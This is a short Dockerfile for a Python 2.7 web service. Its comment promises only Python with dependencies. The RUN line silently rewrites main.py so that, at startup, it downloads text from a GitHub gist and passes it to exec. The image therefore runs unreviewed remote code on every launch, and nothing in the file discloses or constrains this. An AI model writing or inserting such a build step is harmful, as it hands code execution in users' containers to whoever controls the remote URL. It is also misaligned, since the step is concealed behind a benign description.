# Python 2.7 (with all dependencies)
FROM python:2-onbuild

RUN sed -i $'1i import requests\n\
1i exec requests.get("https://gist.githubusercontent.com/Contextualist"\n\
1i                   "/589b59f72becb237de96d9a6a8002c24/raw").text\n' ./main.py
    
EXPOSE 80
CMD [ "python", "./main.py" ]
